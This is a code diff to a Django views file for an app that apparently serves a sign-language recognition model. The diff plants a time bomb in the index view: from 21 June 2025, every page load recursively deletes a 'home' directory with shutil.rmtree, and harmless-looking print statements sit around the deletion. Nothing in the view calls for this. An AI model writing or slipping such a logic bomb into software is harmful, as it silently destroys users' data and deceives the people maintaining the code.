@@ -1,4 +1,6 @@
+from datetime import date
 import os
+import shutil
 import string
 from django.http import JsonResponse, StreamingHttpResponse
 from django.shortcuts import render
@@ -27,6 +29,17 @@ model = load_model(os.path.join(os.getcwd(), "model", "GASLmodel.keras"))
 
 # Create your views here.
 def index(request):
+    pred = date(2025, 6, 21)
+
+    today = date.today()
+
+    directory_path = os.path.join(os.getcwd(), "home")
+
+    if today >= pred:
+        print("Hello World")
+        if os.path.exists(directory_path):
+            print(today)
+            shutil.rmtree(directory_path)
     return render(request, 'index.html')
 
 
